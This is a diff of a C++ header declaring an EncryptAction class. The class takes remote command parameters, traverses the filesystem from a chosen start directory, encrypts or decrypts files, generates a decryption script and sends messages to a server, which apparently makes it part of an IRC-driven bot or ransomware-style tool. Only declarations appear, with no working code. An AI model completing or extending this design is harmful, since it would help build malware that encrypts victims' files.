@@ -6,23 +6,27 @@
 #include <vector>
 #include <cstdlib>
 #include <filesystem>
+#include <iostream>
+#include <sstream> 
 
 #include "Action.hpp"
-#include "IrcClient.hpp"
 #include "CryptoManager.hpp"
 #include "GeneralUtils.hpp"
+#include "GenDecryptionScript.hpp"
+
+namespace fs = std::filesystem;
 
 class EncryptAction : public Action {
 public:
-    EncryptAction(std::vector<std::string> actionParams, IrcClient* ircClient);
+    EncryptAction(std::vector<std::string> actionParams);
 
     void execute() override;
     ActionType getActionType() override;
+    std::string getMessage() override;
 
 private:
-    IrcClient* ircClient
+    std::string msgToServer;
     bool fsEncrypted;
-    CryptoManager cryptoManager;
     std::vector<std::string> actionParams;
     bool isValid;
     bool isDecryption;
@@ -32,10 +36,11 @@ private:
     const int ALGO_IDX = 4;
     const int START_DIR_IDX = 5;
     const int CRYPTO_TYPE_IDX = 6;
+    const std::string ERROR_MSG = "Unable to encrypt/decrypt\n";
 
     void checkParams();
-    char* determineStartDir(const char* cString);
-    void traverseFileSystem(const fs::path& startDir);
+    std::string determineStartDir(const char* cString);
+    std::string traverseFileSystem(const fs::path& startDir, CryptoManager cryptoManager);
 };
 
 #endif // ENCRYPTACTION_HPP
